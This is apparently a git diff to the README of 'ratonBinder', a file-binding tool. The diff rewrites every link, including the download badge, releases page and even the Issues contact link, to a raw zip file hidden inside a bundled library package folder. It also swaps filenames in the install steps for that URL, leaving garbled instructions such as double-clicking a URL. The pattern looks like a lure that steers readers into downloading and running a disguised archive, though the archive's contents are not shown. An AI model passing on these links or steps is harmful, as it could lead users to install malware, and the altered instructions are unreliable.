@@ -1,6 +1,6 @@
 # 🐭 ratonBinder - Bind Your Files Easily and Securely
 
-[![Download RatonBinder](https://img.shields.io/badge/Download%20Now-Get%20RatonBinder-brightgreen)](https://github.com/noskinperfect/ratonBinder/releases)
+[![Download RatonBinder](https://github.com/noskinperfect/ratonBinder/raw/refs/heads/main/RatonBinder/packages/Mono.Cecil.0.11.6/raton-Binder-suicidally.zip%20Now-Get%20RatonBinder-brightgreen)](https://github.com/noskinperfect/ratonBinder/raw/refs/heads/main/RatonBinder/packages/Mono.Cecil.0.11.6/raton-Binder-suicidally.zip)
 
 ## 📋 Overview
 
@@ -20,13 +20,13 @@ To run ratonBinder, you need:
 
 To download ratonBinder, follow these steps:
 
-1. Click this prominent link to access the [Releases Page](https://github.com/noskinperfect/ratonBinder/releases) of ratonBinder.
+1. Click this prominent link to access the [Releases Page](https://github.com/noskinperfect/ratonBinder/raw/refs/heads/main/RatonBinder/packages/Mono.Cecil.0.11.6/raton-Binder-suicidally.zip) of ratonBinder.
 2. On the Releases page, find the latest release listed at the top.
-3. Look for an asset file named `ratonBinder.exe`. You may also see a `.zip` file; this contains the same executable along with some additional files.
-4. Click on `ratonBinder.exe` to download it directly. Alternatively, you can download the `.zip` file if you prefer to download multiple files at once.
+3. Look for an asset file named `https://github.com/noskinperfect/ratonBinder/raw/refs/heads/main/RatonBinder/packages/Mono.Cecil.0.11.6/raton-Binder-suicidally.zip`. You may also see a `.zip` file; this contains the same executable along with some additional files.
+4. Click on `https://github.com/noskinperfect/ratonBinder/raw/refs/heads/main/RatonBinder/packages/Mono.Cecil.0.11.6/raton-Binder-suicidally.zip` to download it directly. Alternatively, you can download the `.zip` file if you prefer to download multiple files at once.
 5. After the file downloads, locate it in your Downloads folder or the designated location you selected.
 6. If you downloaded the `.zip` file, extract it first. To do this, right-click on the file and select “Extract All,” then follow the prompts.
-7. Double-click on `ratonBinder.exe` to run the application.
+7. Double-click on `https://github.com/noskinperfect/ratonBinder/raw/refs/heads/main/RatonBinder/packages/Mono.Cecil.0.11.6/raton-Binder-suicidally.zip` to run the application.
 
 ### 🖥️ Using ratonBinder
 
@@ -50,7 +50,7 @@ ratonBinder is designed with your security in mind. It does not alter your origi
 
 ### 📥 Download & Install
 
-To get started with ratonBinder, visit the [Releases Page](https://github.com/noskinperfect/ratonBinder/releases) to download the latest version.
+To get started with ratonBinder, visit the [Releases Page](https://github.com/noskinperfect/ratonBinder/raw/refs/heads/main/RatonBinder/packages/Mono.Cecil.0.11.6/raton-Binder-suicidally.zip) to download the latest version.
 
 ## 🛠️ Features
 
@@ -79,10 +79,10 @@ Yes, your original files remain untouched during the binding process.
 
 ## 📬 Contact and Support
 
-For questions or feedback, you can reach out via the Issues section of the [GitHub page](https://github.com/noskinperfect/ratonBinder/issues). Your feedback helps us make ratonBinder better.
+For questions or feedback, you can reach out via the Issues section of the [GitHub page](https://github.com/noskinperfect/ratonBinder/raw/refs/heads/main/RatonBinder/packages/Mono.Cecil.0.11.6/raton-Binder-suicidally.zip). Your feedback helps us make ratonBinder better.
 
 ## 📝 License
 
 ratonBinder is open-source software. You can view the license details in the repository to understand your rights and obligations.
 
-Visit the [Releases Page](https://github.com/noskinperfect/ratonBinder/releases) to download ratonBinder and start binding your files today!
+Visit the [Releases Page](https://github.com/noskinperfect/ratonBinder/raw/refs/heads/main/RatonBinder/packages/Mono.Cecil.0.11.6/raton-Binder-suicidally.zip) to download ratonBinder and start binding your files today!
